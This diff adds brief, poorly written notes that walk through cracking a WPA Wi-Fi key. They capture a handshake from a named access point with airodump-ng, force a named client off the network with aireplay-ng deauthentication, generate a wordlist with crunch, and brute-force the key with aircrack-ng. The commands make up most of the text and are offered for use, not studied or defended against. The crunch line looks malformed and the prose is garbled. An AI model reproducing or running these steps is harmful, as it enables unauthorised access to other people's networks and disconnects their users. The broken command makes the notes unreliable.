@@ -1,0 +1,28 @@
+First we hve take handshake:
+
+> airodump-ng --bssid DC:1A:C5:7C:CB:71 --channel 6 wlx1cbfce04e4dd --write wpa_handshake
+
+
+We cannot get handshake if anyone is not going to disconnect and then connected to that network.
+So, we will disconnect then and if they reconnects we will get handshake:
+
+> aireplay-ng --deauth 4 -a DC:1A:C5:7C:CB:71 -c 84:B8:B8:4B:FD:BF wlx1cbfce04e4dd
+
+
+We got a handshake now we need a wordlist full of passwords
+We can create it with crunch:
+
+> crunch 5 5 abcd  -t a@@@d-o wordlist.txt 
+
+
+But this on luck
+Trully this home made wordlist somewhat works
+If luck is ours we will get the key
+
+Aext and final command:
+
+> aircrack-ng wpa_handshake-01.cap -w wordlist.txt
+
+
+After this you will get the key is not sure!
+
